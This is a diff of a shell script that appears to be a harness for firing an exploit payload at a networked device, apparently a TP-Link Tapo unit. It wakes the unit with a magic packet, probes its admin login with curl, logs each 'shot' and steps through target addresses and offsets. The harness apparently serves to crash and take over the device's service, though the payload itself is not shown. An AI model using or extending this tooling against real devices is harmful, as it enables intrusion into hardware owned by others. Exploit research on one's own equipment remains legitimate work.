@@ -92,27 +92,22 @@ done
 
 ip="$(resolve_ip)"
 [ -n "$ip" ] || { log "FATAL: present but the MAC resolved to no address"; exit 4; }
-log "unit $ip — gap ${GUARD_GAP}s, then one shot"
+log "unit $ip — waking + gap ${GUARD_GAP}s, then one shot"
 # instrumented-fire classification (OMP review P2): every fire must carry
 # DS-open latency, time-since-wake, and the outcome signature so 579
 # ambiguous negatives become a stratified classifier corpus.
 FIRE_TS=$(date +%s)
+# the vendor apps wake a sleeping unit with a WoWLAN magic packet; so do we
+timeout 90 "$PY" "$REACH" "$ip" --wake-mac "$MAC" --tries 4 >/dev/null 2>&1 || true
 emit fire "{\"ip\":\"$ip\",\"gap_s\":${GUARD_GAP},\"addr\":\"$ADDR\",\"ts\":$FIRE_TS}"
 sleep "$GUARD_GAP"
 
 # state before the shot: a crash mid-fire must not produce a second payload
 echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 
-ds_ready() { # 1 when the DS answers a login — a crashed shot can leave it dead
-  local _t out
-  for _t in 1 2 3; do
-    out=$(curl -s --connect-timeout 3 -m 5 \
-      -d '{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}' \
-      "http://$ip/" 2>/dev/null | head -1)
-    echo "$out" | grep -q stok && return 0
-    sleep 2
-  done
-  return 1
+REACH="${REACH:-$HERE/tapo_reach.py}"
+ds_ready() { # wake the unit and prove the DS accepts a login — the only "can it execute"
+  timeout 90 "$PY" "$REACH" "$ip" --wake-mac "$MAC" --tries 4 >/dev/null 2>&1
 }
 
 shot() { # shot <offset> — one guarded fire at the current addr
